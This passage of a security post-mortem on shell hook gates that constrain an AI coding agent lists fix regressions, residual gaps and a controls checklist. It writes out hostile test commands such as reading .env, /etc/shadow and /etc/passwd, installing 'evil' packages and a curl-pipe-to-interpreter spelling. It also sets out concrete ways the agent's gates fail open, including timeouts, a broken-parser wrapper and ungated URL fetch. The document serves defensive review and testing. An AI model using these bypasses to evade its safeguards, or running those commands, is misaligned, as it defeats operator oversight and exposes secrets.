consecutive fix commits have now introduced a defect"* and names the round-2
remediation as `fac2897`, `9952741`, `edac7c7`, `ff435f5` — five with `0fba4d2`.
The round-4 brief says *six*, *"the most recent of those six is `b1782ec`"*.
`b5d7f71`'s own changelog says six had shipped and *"this is the seventh
attempt"* — and it shipped too (`f1ed58c`), making seven. **This is a floor, not
a ceiling:** `311bd67`, `4cc9742` and `0ec72d0` each have the same evidence
against them and are simply outside the window anyone counted.

Round 7 alone found an unhashable `matcher` that aborted install at 22 of 58
files with no gates registered, and a proxy that deleted the operator's
`settings.json` keys on any declined write.

> **The unit is COMMITS, and the drift is the lesson. `[+2026-07-31]`** The
> round-4 brief established this figure over *commits*, and its three reviewers
> confirmed it independently. The round-5 brief then warned in terms that
> re-deriving it *"from batches produces a different, worse-supported number"* —
> and it was relabelled "batches" anyway, then carried forward twice more, to
> seven and to eight, without anyone re-deriving anything. Restored here. The six
> fix commits between `b5d7f71` and the autonomous-mode batch were never assessed
> against this predicate, so nothing supports an unbroken run past round 4 — and
> at least one of them produced two in-class defects that **tests** caught before
> landing, which the "never the suite" clause would have to exclude. **A number
> that survives by inheritance stops being a measurement.**
>
> **And the first attempt at this list was wrong, which is the point.** It was
> reconstructed by reading commit *subject lines* — plausible, self-consistent,
> and it included `311bd67` (outside the counted window) while omitting
> `fac2897` entirely, because `fac2897` is a `test(gates):` commit and the eye
> skips it when scanning for `fix(`. Right count, wrong membership. The list
> above comes from the three places that state it explicitly instead. **An
> enumeration built from what a commit calls itself is the same error as a count
> built from what the last document called it.**

**The next batch to receive an independent round did it three times, and each
catch needed a different instrument. `[+2026-07-31]`** The autonomous-mode batch
fixed an *unbounded-block* class — a control whose bound was inoperative and
silent about it.

1. **First cut:** the new `stop_hook_active` bound read
   `[ "$(jget '.stop_hook_active')" = "true" ]`. `jget` routes a missing parser
   through `hook_fail`, whose `exit 2` dies with the **command substitution**, not
   the script — so the guard read empty, the bound could never fire, and the hook
   blocked every `Stop` forever. *Caught by execution, after commit.*
2. **Second cut:** replaced with `if have_jq || have_py`, degrading to allow.
   Still a **presence** test (P0-3d): with a broken-but-present jq the guard took
   the true branch, the bound read empty, and the hook blocked every `Stop` —
   `rc=1` before the batch, `rc=2` after, with the degrade message never printed.
   *Caught by the independent adversarial round.*
3. **The repair of its test:** a check asserting the bound exists compared
   `str.find()` results with no lower guard, so `-1 < 28191` passed with the bound
   deleted outright. The first repair anchored on the bare token
   `stop_hook_active` — which also appears in the **comment block explaining the
   bound** — so it still passed with the guard removed. *Caught by mutation
   testing.*

Three instances, one batch, three different detection instruments, and **none of
them was the test suite** — which was green at every point, running 1835 checks
before the batch and 1905 after. It grew by 70 while all three slipped past it.

> **Two rules from the third one, because it is the least obvious.** A *repair*
> can be unsound in the same class as the thing it repairs — re-run the mutation
> against the fixed check, not just against the fixed code. And **a string
> assertion on emitted code can be satisfied by the prose describing that code**:
> anchor on the executable form (`if parser_ok; then`), never on a token that a
> nearby comment also contains. The better the comment, the more likely it
> defeats the check.

The v2.6.0 *documentation* release continued the pattern: its brand-new §6.D
checklist item recorded `sh -c "git commit"` as unmatched — a limitation the
implementation had removed two review rounds earlier — and cited as its source a
backlog row that had been flagged **the previous day** as "describing neither
substrate."

> **Rule:** when new normative text cites a tracking row, read the row's *status*,
> not just its claim. A row awaiting a decision is not settled fact. And budget an
> out-of-suite pass on every security fix batch, because in this repository's
> entire history the green suite has never once caught the follow-on defect —
> every catch came from an independent adversarial round, from executing the
> artifact, or from mutating it. `[+2026-07-31]` Budget all three: the eighth
> batch needed a different one of them for each of its three instances, and no
> one instrument would have found the other two.

---

## 6. Residual gaps in v2.6.0 — EXECUTED

Recorded so the next round starts here rather than rediscovering them. None is a
regression; all are scope limits or open decisions. **Filed as
`docs/deferred-backlog.md` cluster N** (N-1 … N-5) except where an existing cluster
already owns them — cluster IDs are given inline below.

```
-- dependency-gate: ecosystems still unmatched --
mix deps.get              rc=0        Elixir
rebar3 get-deps           rc=0        Erlang
nimble install x          rc=0        Nim
opam install x            rc=0        OCaml
apt-get install x         rc=0        system package manager        (N-2)
gem install x             rc=2        (Ruby IS covered)

-- secrets-gate: content is never inspected --
Write "-----BEGIN RSA PRIVATE KEY-----..." to notes.md    rc=0   (N-3)

-- no project-boundary / traversal check --
Read ../../etc/passwd     rc=0                                    (N-4)
Read /etc/shadow          rc=0

-- tool surface not fully covered --
matchers: ['Bash', 'Read|Write|Edit|NotebookEdit|Grep|Glob', 'Write', 'Write|Edit']
WebFetch covered: False        # WebFetch(file://) and exfil-by-URL are ungated
                               # (N-5; policy question is K-5)

-- documented control not implemented --
§6.D requires `chmod 700` on the hooks directory; emitted mode is 755,
and no suite asserts it.                             (backlog M-1)

-- the advertised remediation path is inert --
dependency-gate refuses with "update .claude/steering/deps.md", but the
approved list is baked in at emission from `deps.approved`. Editing the
file changes nothing until the installer is re-run. Compounding: the
installer SKIPs a locally-modified deps.md, so an operator who edits it
never receives the new refusal-class documentation either.      (N-1)

-- policy question, deliberately open --
spec-gate-commit still blocks the first CODE commit: spec-decompose
produces behaviors, not filenames, so no source path is ever in the
corpus.                                              (backlog A-6)

-- SDK substrate gap --
No ci-mirror equivalent, so CI checks do not run before a push under
sdk-callable dispatch.                               (backlog K-2)

-- drift detector --
Only the tier-1 counter is implemented; tier-2/tier-3 escalation, the
hard block, and audio dispatch are not.              (backlog I-1)
```

**Post-tag additions `[+2026-07-31]`** — found by the round that first executed
the emitted **wrappers**, and by the adversarial pass on its fix batch. Filed as
`docs/deferred-backlog.md` clusters **O** and **P**; the highest-signal ones:

```
-- a safety fix does not reach the installs that need it --
Upgrade over an install whose wrappers the operator has begun completing:
  UPDATE  .claude/hooks/…            <- both HOOK fixes land
  SKIP    .claude/loop.sh  (locally modified; use --force to overwrite)
  SKIP    .claude/goal-loop.sh
  SKIP    .claude/auto.sh            <- all three WRAPPER fixes withheld
  Done. … skipped=3      rc=0, no warning that a fix was withheld
Population affected is exactly the one running loops.            (P-1)

-- a control that blocks but does not enforce --
The iteration-summary Stop gate now exits 2, but its bound sits ABOVE the
demand, so turn 2 is allowed whether or not the agent complied:
  Stop #1 rc=2   Stop #2 (stop_hook_active) rc=0   Stop #3 rc=2
One extra turn per iteration; no enforcement across turns.        (P-2)

-- the durable record is inverted --
Across those three stops hooks.log holds exactly ONE line, and it is the
one saying the gate declined to act. Every allow path logs; the exit-2
enforcement branch is the only silent outcome in the hook.        (P-3)

-- the control demands a file nothing teaches --
`.iteration-summary-*` appears only in the hook, .claude/.gitignore and
settings.json — not in any doc, skill, command or wrapper the agent
reads. Stated once, in the stderr of the block.                   (P-4)

-- parity suites are structurally blind to a missing twin --
Every substrate-differential assertion iterates SDK_GATES, the smaller
side, so a shell control with no SDK counterpart is invisible. Executed:
adding an always-deny shell hook with no twin left both parity suites
green at 176/0 and 96/0.                                          (P-17)

-- the parser fix stops at "exited clean", not "parsed" --
P0-3d's fix accepts any parser that exits 0, so anything named `jq`
that exits 0 without producing a parse reads as a successful EMPTY
parse and the `case` falls through to allow. The realistic shape is
NOT an exotic tool: it is a defensive wrapper — `real-jq "$@" || true;
exit 0` — over a jq that is broken. That is the SAME `|| true` idiom
the fix just removed from jget, one layer out, in a file the operator
owns. Executed against that substrate, python3 healthy on the PATH:
  secrets-gate     cat .env           rc=0  ALLOWED
  dependency-gate  npm install evil   rc=0  ALLOWED
Bounded honestly — these DENY, so the gap is narrower than "any
wrapper": a swallowing wrapper over a WORKING jq (real answer still
returned) and a wrapper that prepends a banner to stdout (polluted
output still contains the command). Absent / broken / non-executable
jq all rc=2. §4.6's remedy is the capability probe: parse a known
literal, compare.                                                 (P-19)
```

**Post-tag, 2026-08-13 — four MEASURED, OPEN, fail-open cost classes.** These
postdate the P-19 block above and belong in this section because they are exactly
what it exists to record: known, not yet closed, and cheap to rediscover the hard
way. All are `docs/deferred-backlog.md` cluster X, and all are **pre-existing** —
none was introduced by the X-52 fix, and none is closed by it.

```
A wrapper head plus quote-dense padding runs the invoker walk to the
end of the tail on every quoted run. `sudo` + 2000 runs is 80004 B /
4000 jumps — INSIDE both shipped caps — and crosses the 60 s ceiling
on main and on the fix alike. Its quote-free sibling `i` x 40000
crosses at 79.72 s with no quoting and zero jump targets.        (X-54)

A decider that STAYS the trailing word makes the walk O(runs x
tokens), and the per-segment memo cannot help by construction —
measured pre-existing at the last reviewed commit.               (X-55)

Two of the invoker memo's three soundness invariants are pinned by
nothing; a regression in either is fail-open and invisible to the
verdict differential.                                            (X-56)

The two substrates disagree about which characters separate shell
words, and the shell's answer depends on the ambient locale.      (X-53)
```

**Also owed and NOT run:** a fresh head-class cost measurement on the merged tree
(`053a367`). Every cost figure in this document and in the backlog predates the
per-segment memo or was taken on an earlier commit. See §4.11.

---

## 7. Reusable controls checklist

Derived from the above; ordered by how much each would have caught here.

**Enforcement reality**
- [ ] Every blocking control has a must-deny payload and a must-allow payload, both asserted against the **deployed** artifact.
- [ ] Every security regression test is demonstrated to **fail before** its fix.
- [ ] The runtime's control semantics (which exit codes block, what makes a control advisory) are written down and asserted, not assumed.
- [ ] No control is marked async/background/non-blocking unless it is purely informational.
- [ ] Controls that are *scripts the operator runs* (wrappers, runners, CLIs) are executed too, not only the ones the runtime invokes. `[+2026-07-31]`
- [ ] A suite that cannot run on this host reports **SKIPPED**, distinctly from one that ran and passed — `0 passed, 0 failed` + exit 0 must never render as `ok`. `[+2026-07-31]`
- [ ] String assertions on emitted code anchor on the **executable** form, not a token a neighbouring comment also contains. `[+2026-07-31]`
- [ ] Mutation is re-run against a **repaired check**, not only against repaired code — a fix to a test can reproduce the defect it was fixing. `[+2026-07-31]`
- [ ] A verification control is proven to run against **the tree the work happened in**. Anything reaching its code through a fixed mount or a remote shell (`docker compose exec`, `kubectl exec`, `ssh`) ignores the caller's directory, so a control paired with per-task worktrees can verify a tree nobody edited. Probe it (`… exec -T <svc> pwd` from inside the worktree) rather than assuming. `[+2026-07-31]`
- [ ] For any two features touching the same execution, the requirement each places on the other is written where **both** are read from — or the dependent feature refuses to switch on while the precondition is unstated. Per-feature review cannot see a pair. `[+2026-07-31]`
- [ ] For every artifact one component **writes** and another **manages**, ownership of its *contents* is written down separately from ownership of its *existence* and *lifecycle* — and the round trip is tested: write the documented payload, run the manager, assert the payload survives. `[+2026-07-31]`
- [ ] Before any code is allowed to destroy state, the question *"what reads this, and does anything key on its emptiness?"* is answered by inspection, not inferred from surrounding code that looks like lifecycle machinery. `[+2026-07-31]`
- [ ] Every **widening** of a deny-list control is reviewed as a new control: the original corpus is re-run *and* the new allowance is fuzzed specifically, because the exemption's own guardrails are the surface the widening created. "The error is in the safe direction" describes the bug, never the fix. `[+2026-07-31]`
- [ ] Every widening carries a **round budget decided in advance**, and an answer to "what if it does not converge". A widening that needs the attacker's full grammar is a parser, not a patch — price it that way, and remember that the honest fix for an over-refusal is often a better *refusal*. `[+2026-08-03]`
- [ ] No release of a control ships without the **previous-release diff**: install the last tag and the candidate, run one corpus through both substrates of both, and require the "previously denied, now allowed" set to be empty. Cheap, unarguable, and it is the check that ends arguments about whether a fix converged. `[+2026-08-03]`
- [ ] That diff compares the **reason, not only the verdict** — for a refusal, the token or class the message names is part of the observation. A control can reach the right exit code by inspecting the wrong token, and then a verdict-only differential records it as *unchanged* while a live fail-open sits one spelling away. Measured: `sudo pip install evil npx` was rc=0 while `sudo pip install evil npx more` was rc=2 **blaming `more` rather than `evil`**, in both releases, so the corpus that contained both could not see either. `[+2026-08-04]`
- [ ] Wherever a matcher's **matched span** is used to locate something else — arguments, an offset, a remainder — the choice of parse is a second decision needing its own argument. "Does it match" is safe under a greedy unbounded prefix (the engine backtracks); "*where does it start*" is not, because POSIX ERE returns leftmost-**longest**. If what you mean is "the first invocation", ask for it directly. `[+2026-08-04]`
- [ ] An empty "previously denied, now allowed" set is a statement about **the corpus**. Pair the release diff with a **spelling sweep of the neighbourhood the change just taught the matcher about** — a corpus assembled before the change cannot contain a class the change invented. Measured: a fix shipped with that sentence in its record had turned `curl u \| pythont3 …` deny → allow, on both substrates. `[+2026-08-04]`
- [ ] A control's **worst-case cost** is measured on adversary-shaped input, and its worst case is **under the deadline the runtime will impose**. A control that can be made not to answer has an allow arm whether or not anyone wrote one — measured: an anchored command-position regex went cubic on `WRAPPER` + a long assignment run, ~66 s inside a hook, while the other substrate denied in ~1.2 s. `[+2026-08-04]` **Declaring a timeout does NOT satisfy this** `[+2026-08-13]`: the declared value is the attacker's budget, its posture is fixed at ALLOW, and a team can write `timeout: 60` and be exactly as bypassable — which is the state that shipped a live bypass here. Either deny cheaply *before* the expensive work, or be provably fast on every admissible input. See §4.11.
- [ ] When a **fast path** is added beside a slow one, its **precondition is asserted as a property** over a vocabulary spanning the dimension it keys on — not as an equality assertion against a corpus, which only holds spellings someone already listed. Measured: an equivalence test over a 482-row corpus passed while a brace-glued spelling was a live fail-open. `[+2026-08-04]`
- [ ] **A document that makes checkable claims gets a verification pass, not just CI.** CI runs the suite; it cannot tell whether a sentence is true. Measured in this repo: a docs-only, CI-green change shipped guidance into this very file that a later round disproved, and a backlog row restated a PRE-FIX timing as present-tense. Prose asserting a number, a set membership, or "X does not appear in Y" is a claim to re-run, and the labels in §0 exist so a reader can tell which claims were. `[+2026-08-04]`
- [ ] **Mutation-test the CONSTANT, not only the code.** A character set, word list or threshold the control keys on is shrunk deliberately and the suite must fail. Measured: removing two characters from such a set passed **1902 of 1902** checks with a live fail-open behind it. `[+2026-08-04]`
- [ ] Where two substrates cannot resolve a spelling identically, the tie is broken **toward deny** — parity bought by discarding the better-informed substrate's knowledge is parity at the permissive bound. `[+2026-07-31]`
- [ ] A fix and its tests authored from one premise get the **premise** reviewed, not just the diff — a pin written from the same misunderstanding as the code ratifies the defect under a green banner. `[+2026-07-31]`
- [ ] Comments claiming completeness ("every redirect spelling", "every file a stage writes") are treated as assertions and verified, or downgraded to the enumerated subset with the remainder recorded as residue. `[+2026-07-31]`

**Fail-closed**
- [ ] Every dispatch has an explicit deny arm; no `case` falls through to allow.
- [ ] Missing parser, oversized payload, unwritable filesystem, and malformed input each **deny**, each with a distinct reason. **Timeout is the exception and must be read as one** `[+2026-08-13]`: a deadline your control *owns* (its own `timeout` around a subprocess) routes to deny like the rest, but a deadline the **runtime** owns cannot — a cancelled hook exits 124/137/143, only exit 2 blocks, so it fails OPEN and no arm you write changes that. Make it unreachable instead of trying to route it. See §4.11.
- [ ] Every dependency is probed for **function**, not presence — parse a known literal and compare. A shim, a broken dynamic link, a non-executable file of the right name, and a same-named different tool must all route to the same deny as an absent one; checking only that the dependency *exited clean* catches the first three and not the fourth. `[+2026-07-31]`
- [ ] Fallback between redundant implementations triggers on **failure**, not only on absence — and "returned nothing" is never the same value as "could not run". `[+2026-07-31]`
- [ ] Incidental work (logging, temp files, `mkdir`) cannot kill the process before the decision.
- [ ] An `ERR` trap routes *unanticipated* failures to deny.
- [ ] Advisory controls declare their posture explicitly and degrade to a logged no-op — and the posture is set where it cannot be shadowed by an earlier exit.

**Untrusted input**
- [ ] Every file a control reads is classified: can the agent write it?
- [ ] No agent-writable value reaches arithmetic, `eval`, `source`, or any deserializer.
- [ ] No control accepts agent-producible *evidence* that a check passed. Re-run the check.
- [ ] Payloads travel on stdin or a file, never an environment variable (128 KiB ceiling).

**Coverage**
- [ ] The complete set of tools that can achieve the gated capability is enumerated and tested — including shell, search, notebook, and fetch tools.
- [ ] Each tool's actual parameter name is handled (`file_path` ≠ `notebook_path` ≠ `command` ≠ `url`).
- [ ] Command matching is quote-aware, escape-aware, newline-aware, anchored to command position, and **re-enters on invoker arguments to a stated depth**.

**Precision**
- [ ] False positives measured on real traffic before enforcement is enabled.
- [ ] The control is tested against the tree the installer itself produces, on commit one.
- [ ] Refusal messages name the *actual* reason and a remediation path that works.

**Disclosure**
- [ ] Every protection claimed in operator-facing docs is executed and verified.
- [ ] Defaults that advertise unimplemented capability are corrected or annotated.
- [ ] When two implementations of one policy exist, one is named canonical and a differential test asserts they agree.

---

## 8. Sources

- `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md` — the six-lens execution review of a real v2.5.0 install. Primary source.
- `docs/lens-a-execution-findings-2026-07-28.md`, `docs/lens-b-execution-findings-2026-07-28.md` — supporting lenses.
- `docs/changelog.md` "2.5.0 → 2.6.0" — the release record.
- `docs/deferred-backlog.md` clusters A, I, J, K, L, M — open decisions and residue.
- `Bootstrap-Protocol-v2-6-0.md` §6.D — the normative hook checklist these lessons are encoded into.
- `tests/test_hook_behavior.py`, `tests/test_substrate_differential.py` — the executing suites.

Post-tag sources `[+2026-07-31]`:

- `docs/changelog.md`, the two 2026-07-31 in-version entries — the P0-3d fix (PR #22) and the autonomous-mode exit contract (PR #23).
- `docs/deferred-backlog.md` clusters **O** and **P** — the wrapper round's residue, and the adversarial pass on its fix batch (45 claims raised, 23 refuted).
- `tests/test_wrapper_behavior.py` — the suite that first executed an emitted wrapper; `P0-3b(ii)` in `tests/test_hook_behavior.py` — the broken-parser substrates.

Post-tag sources `[+2026-08-13]` — the cost class behind §4.11:

- `docs/deferred-backlog.md` cluster **X**, rows **X-50 … X-58** — the class (X-50, X-51), the guard, its bypass, the fix (X-52, `done`) and its four open residuals (X-53 … X-57), plus X-58 on the rendering fault in this cluster's own table.
- **PR #65, merged as `053a367`** — 21 commits, and the account of six self-inflicted regressions, five of them fail-open, shipped and fixed in the course of one fix.
- `.claude/trust-ramp.md`, the `x52-*` and `x49-*` entries — five `harmful` grades, and the record of *which instrument caught what*: review caught four regressions, ad-hoc wall-clock caught two, and the 9668-check suite caught none of them.
- **The same honest deviation from §0 that §4.10 records applies here.** These figures come from named commits, harnesses in `.claude/checkpoints/x52-harnesses/` (gitignored), and live checks against Claude Code — not from a suite you can re-run from this repo. A fresh head-class measurement on `053a367` is owed and has not been taken.

All exit codes in §§1–5 were reproduced on 2026-07-30 against tags `v2.5.0`
(`fc04c10`) and `v2.6.0` (`f6bded0`). Everything marked **`[+2026-07-31]`** was
reproduced that day against `v2.6.0` (`f6bded0`) as the *before* and `main`
(`3355e9c`) as the *after* — so the v2.6.0 column of the P0-3d table is the
tagged release's real behaviour, not a reconstruction.
